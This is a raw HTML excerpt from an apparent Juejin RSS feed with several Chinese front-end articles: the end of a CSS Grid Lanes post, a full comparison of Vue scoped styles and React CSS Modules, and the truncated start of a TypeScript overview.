<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a5acbb0117c14c7fa455f435b1097fa5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768984906&amp;x-signature=p%2FRyUfLtG1ExQjBhIQZ5WnK9ZhQ%3D" alt="" loading="lazy"/></p>
<p>不管屏幕多宽，header 都会出现在右边。其他内容该怎么排怎么排。</p>
<h2 data-id="heading-5">横向布局也能做</h2>
<p>瀑布流是竖着流，Grid Lanes 也能横着流。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/722f59112ec04d458e2b9af3001c3d25~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768984906&amp;x-signature=0X1iEbx0CoZpU76iuFD%2FpegjP2M%3D" alt="" loading="lazy"/></p>
<p>竖着流用 <code>grid-template-columns</code> 定义列：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
    <span class="hljs-attribute">display</span>: grid-lanes;
    <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;
}
</code></pre>
<p>横着流就用 <code>grid-template-rows</code> 定义行：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
    <span class="hljs-attribute">display</span>: grid-lanes;
    <span class="hljs-attribute">grid-template-rows</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;
}
</code></pre>
<p>浏览器会根据你定义的是列还是行，自动判断流的方向。</p>
<p>不用额外设置什么属性，它自己就知道。</p>
<h2 data-id="heading-6">容错度控制</h2>
<p>有个新概念叫容错度。</p>
<p>假设第一列的卡片高度是 100px，第四列是 99px。下一张卡片应该放哪？</p>
<p>如果追求绝对精确，应该放第四列，因为它矮 1px。</p>
<p>但这 1px 根本看不出来，而且会导致卡片顺序很乱。用户 Tab 切换时会跳来跳去。</p>
<p>所以 Grid Lanes 有个默认容错度 <code>1em</code>。只有高度差超过 1em，浏览器才会认为它们不一样。</p>
<p>小于 1em 的差异会被忽略，卡片会更倾向于从左到右排列。</p>
<p>你可以调整这个值：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
    item-tolerance: <span class="hljs-number">2em</span>;
}
</code></pre>
<p>设大一点，布局更规整，但可能浪费空间。设小一点，空间利用率高，但顺序会更乱。</p>
<p>根据你的内容大小和内容差异来调。</p>
<p>注意这个属性名字可能还会改，正式发布前留意一下。</p>
<h2 data-id="heading-7">现在就能试</h2>
<p>Safari 技术预览版 234 已经支持了。</p>
<p>你可以下载来试试，官方 Demo 网站也更新了新语法。</p>
<p>除了图片瀑布流，还有其他用法。</p>
<p>比如做 Mega Menu 的底部链接区域。每组链接高度不同，用 Grid Lanes 排起来非常整齐：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
    <span class="hljs-attribute">display</span>: grid-lanes;
    <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(max-content, <span class="hljs-number">24ch</span>));
    <span class="hljs-attribute">column-gap</span>: <span class="hljs-number">4</span>lh;
}
</code></pre>
<p>各组链接紧密排列，不会浪费空间。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de0584f9f30248c8b67b866fbe24993d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768984906&amp;x-signature=XDuA8aJG9Juf4LWziWFbTdjmeVE%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-8">接下来呢</h2>
<p>CSS 工作组还有几个细节在讨论，但整体语法已经确定了。</p>
<p>现在可以学起来，可以做 Demo 玩玩，可以给反馈。</p>
<p>WebKit 团队从 2022 年中开始做这个功能，现在终于能用了。</p>
<p>我估计其他浏览器也会很快跟进，毕竟这需求太常见了。</p>
<p>以后做瀑布流，再也不用引 JavaScript 库了。</p>
<h2 data-id="heading-9">参考资料：</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwebkit.org%2Fblog%2F17660%2Fintroducing-css-grid-lanes%2F" target="_blank" title="https://webkit.org/blog/17660/introducing-css-grid-lanes/" ref="nofollow noopener noreferrer">Introducing Grid Lanes</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwebkit.org%2Fdemos%2Fgrid-lanes%2F" target="_blank" title="https://webkit.org/demos/grid-lanes/" ref="nofollow noopener noreferrer">Example Gallery</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CSS 也能“私有化”？揭秘模块化 CSS 的防坑指南（附 Vue & React 实战）]]></title>    <link>https://juejin.cn/post/7594817135128412194</link>    <guid>https://juejin.cn/post/7594817135128412194</guid>    <pubDate>2026-01-14T07:49:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594817135128412194" data-draft-id="7594835618119860264" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CSS 也能“私有化”？揭秘模块化 CSS 的防坑指南（附 Vue &amp; React 实战）"/> <meta itemprop="keywords" content="前端,CSS,Vue.js"/> <meta itemprop="datePublished" content="2026-01-14T07:49:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="生椰丝绒拿铁"/> <meta itemprop="url" content="https://juejin.cn/user/4185180725584116"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            CSS 也能“私有化”？揭秘模块化 CSS 的防坑指南（附 Vue &amp; React 实战）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4185180725584116/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    生椰丝绒拿铁
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:49:37.000Z" title="Wed Jan 14 2026 07:49:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>“你改你的样式，我改我的样式，咱俩井水不犯河水。”<br/>
—— 一个被全局 CSS 折磨到秃头的前端开发者</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">🌪️ 从前，有个叫“全局污染”的幽灵</h2>
<p>在前端开发的远古时代（其实也就几年前），我们写 CSS 是这样的：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.button</span> {
  <span class="hljs-attribute">background</span>: red;
}
</code></pre>
<p>然后某天，同学也写了 <code>.button</code>，但颜色是蓝色。结果——<strong>按钮变蓝了！</strong><br/>
你一脸懵：“我写的红呢？”<br/>
他更懵：“我也没动你的代码啊！”</p>
<p>这就是 <strong>CSS 全局作用域</strong> 的经典翻车现场。</p>
<p><strong>类名冲突、样式覆盖、调试到凌晨三点……</strong><br/>
于是，聪明的前端工程师们开始思考：<strong>能不能让 CSS 也像 JavaScript 一样“模块化”？</strong></p>
<p>答案是：<strong>能！而且还不止一种方式。</strong></p>
<hr/>
<h2 data-id="heading-1">🧩 模块化 CSS：给样式加上“私有锁”</h2>
<p>模块化 CSS 的核心思想很简单：<strong>每个组件的样式只对自己生效，不污染别人，也不被别人污染。</strong></p>
<p>听起来像“社恐”的理想生活状态？没错！它就是为组件化开发量身定制的“社交距离”。</p>
<p>目前主流框架提供了两种实现路径：</p>
<ul>
<li><strong>Vue：<code>scoped</code> 属性</strong></li>
<li><strong>React：CSS Modules（<code>.module.css</code>）</strong></li>
</ul>
<p>下面，咱们就来拆解这两种“防冲突神器”，顺便看看它们背后的小秘密。</p>
<hr/>
<h2 data-id="heading-2">🎭 Vue 的 <code>scoped</code>：优雅又高效</h2>
<p>在 Vue 单文件组件中，只需加个 <code>scoped</code>，就能自动隔离样式：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"txt"</span>&gt;</span>Hello World<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.txt</span> {
  <span class="hljs-attribute">color</span>: red;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h3 data-id="heading-3">🔍 它是怎么做到的？</h3>
<p>Vue 并不会重命名你的类名（比如变成 <code>txt_abc123</code>），而是<strong>在编译时给每个元素加一个唯一的 <code>data-v-xxxxx</code> 属性</strong>，然后把 CSS 选择器也加上这个属性：</p>
<pre><code class="hljs language-ini" lang="ini">&lt;h1 <span class="hljs-attr">class</span>=<span class="hljs-string">"txt"</span> data-v-f3f3eg9&gt;Hello World&lt;/h1&gt;
</code></pre>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.txt</span><span class="hljs-selector-attr">[data-v-f3f3eg9]</span> {
  <span class="hljs-attribute">color</span>: red;
}
</code></pre>
<p>✅ <strong>优点</strong>：</p>
<ul>
<li>类名不变，可读性强</li>
<li>编译一次，性能好</li>
<li>写法简洁，零配置</li>
</ul>
<p>❌ <strong>小缺点</strong>：</p>
<ul>
<li>深度选择器（如修改子组件样式）需要特殊语法（<code>::v-deep</code>）</li>
<li>动态生成的 HTML（如 <code>v-html</code>）无法自动带上属性</li>
</ul>
<blockquote>
<p>就像给每个组件发了一张“门禁卡”，只有本组件的人才能进。</p>
</blockquote>
<hr/>
<h2 data-id="heading-4">🧪 React 的 CSS Modules：JS 化的样式对象</h2>
<p>React 本身不处理样式，但通过 <strong>CSS Modules</strong>，我们可以这样写：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> styles <span class="hljs-keyword">from</span> <span class="hljs-string">'./Button.module.css'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Button</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.button}</span>&gt;</span>Click me<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;
}
</code></pre>
<p>对应的 <code>Button.module.css</code>：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.button</span> {
  <span class="hljs-attribute">background</span>: blue;
  <span class="hljs-attribute">color</span>: white;
}
</code></pre>
<h3 data-id="heading-5">🔍 背后发生了什么？</h3>
<p>Webpack（或其他打包工具）会把 <code>.module.css</code> 文件编译成一个 <strong>JS 对象</strong>：</p>
<pre><code class="hljs language-css" lang="css">// 编译后 styles 长这样
{
  <span class="hljs-selector-tag">button</span>: <span class="hljs-string">"Button_button__abc123"</span>
}
</code></pre>
<p>最终渲染的 HTML：</p>
<pre><code class="hljs language-ini" lang="ini">&lt;button <span class="hljs-attr">class</span>=<span class="hljs-string">"Button_button__abc123"</span>&gt;Click me&lt;/button&gt;
</code></pre>
<p>✅ <strong>优点</strong>：</p>
<ul>
<li>类名绝对唯一，彻底隔离</li>
<li>支持动态拼接（<code>className={</code><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>y</mi><mi>l</mi><mi>e</mi><mi>s</mi><mi mathvariant="normal">.</mi><mi>b</mi><mi>t</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">{styles.btn} </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">es</span><span class="mord">.</span><span class="mord mathnormal">b</span><span class="mord mathnormal">t</span><span class="mord mathnormal">n</span></span></span></span></span></span>{isActive ? styles.active : ''}<code>}</code>）</li>
<li>适合大型项目、开源组件库</li>
</ul>
<p>❌ <strong>小缺点</strong>：</p>
<ul>
<li>类名被哈希化，调试时看着有点懵</li>
<li>需要手动导入，略显啰嗦</li>
</ul>
<blockquote>
<p>这就像给每个样式贴上了“身份证号”，全球唯一，永不重复。</p>
</blockquote>
<hr/>
<h2 data-id="heading-6">🤔 scoped vs CSS Modules：谁更香？</h2>



































<table><thead><tr><th>特性</th><th>Vue <code>scoped</code></th><th>React CSS Modules</th></tr></thead><tbody><tr><td>配置难度</td><td>零配置</td><td>需要构建工具支持</td></tr><tr><td>类名可读性</td><td>高（原样保留）</td><td>低（哈希化）</td></tr><tr><td>性能</td><td>高（属性选择器）</td><td>中（字符串拼接）</td></tr><tr><td>深度控制</td><td>需 <code>::v-deep</code></td><td>可直接组合类名</td></tr><tr><td>适用场景</td><td>Vue 项目首选</td><td>React / 多人协作 / 开源库</td></tr></tbody></table>
<p><strong>总结一句话</strong>：</p>
<blockquote>
<p>Vue 用 <code>scoped</code> 图省事，React 用 CSS Modules 图安全。</p>
</blockquote>
<hr/>
<h2 data-id="heading-7">💡 真实世界的建议</h2>
<ol>
<li><strong>不要混用全局 CSS 和模块化 CSS</strong><br/>
如果你在用 <code>scoped</code> 或 <code>module.css</code>，就别再在全局写 <code>.button</code> 了，否则等于给自己挖坑。</li>
<li><strong>命名依然重要</strong><br/>
即使有模块化，也别写 <code>.a</code>, <code>.b</code> 这种名字。清晰的命名 = 清晰的逻辑。</li>
<li><strong>开源组件请务必模块化</strong><br/>
别人用你的组件，最怕“样式污染”。模块化是基本礼仪！</li>
<li><strong>考虑 CSS-in-JS？</strong><br/>
如 styled-components、Emotion，它们把样式直接写在 JS 里，更极致的模块化。但这是另一个故事了……</li>
</ol>
<hr/>
<h2 data-id="heading-8">🎉 结语：CSS 也可以很“私密”</h2>
<p>从前，CSS 是开放的广场，人人可踩；<br/>
如今，CSS 是带锁的房间，各归其位。</p>
<p>模块化 CSS 不是银弹，但它<strong>极大降低了协作成本，提升了代码可维护性</strong>。<br/>
尤其在团队作战、组件复用、开源共享的今天，它早已不是“可选项”，而是<strong>必备技能</strong>。</p>
<p>所以，下次写样式前，先问自己一句：</p>
<blockquote>
<p>“这行 CSS，真的只属于我吗？”</p>
</blockquote>
<p>如果不是——那就给它上把锁吧 🔒</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TypeScript 知识总结]]></title>    <link>https://juejin.cn/post/7595021656427364379</link>    <guid>https://juejin.cn/post/7595021656427364379</guid>    <pubDate>2026-01-14T08:00:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595021656427364379" data-draft-id="7594919272688173082" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TypeScript 知识总结"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-14T08:00:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="米诺zuo"/> <meta itemprop="url" content="https://juejin.cn/user/2436173497373399"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TypeScript 知识总结
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2436173497373399/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    米诺zuo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T08:00:14.000Z" title="Wed Jan 14 2026 08:00:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">目录</h2>
<ol>
<li><a href="#1-typescript-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8" title="#1-typescript-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8">TypeScript 基础入门</a></li>
<li><a href="#2-%E6%A0%B8%E5%BF%83%E5%86%85%E7%BD%AE%E5%B7%A5%E5%85%B7%E7%B1%BB%E5%9E%8B%E8%A7%A3%E6%9E%90" title="#2-%E6%A0%B8%E5%BF%83%E5%86%85%E7%BD%AE%E5%B7%A5%E5%85%B7%E7%B1%BB%E5%9E%8B%E8%A7%A3%E6%9E%90">核心内置工具类型解析</a></li>
<li><a href="#3-%E9%AB%98%E7%BA%A7%E7%89%B9%E6%80%A7" title="#3-%E9%AB%98%E7%BA%A7%E7%89%B9%E6%80%A7">高级特性</a></li>
<li><a href="#4-%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95-typescript-%E9%87%8D%E7%82%B9" title="#4-%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95-typescript-%E9%87%8D%E7%82%B9">前端面试 TypeScript 重点</a></li>
</ol>
<hr/>
<h2 data-id="heading-1">1. TypeScript 基础入门</h2>
<p>TypeScript 是 JavaScript 的超集，添加了静态类型系统。掌握它是现代前端开发（尤其是 Angular/Vue 3）的基石。</p>
<h3 data-id="heading-2">1.1 为什么要用 TypeScript？</h3>
<ul>
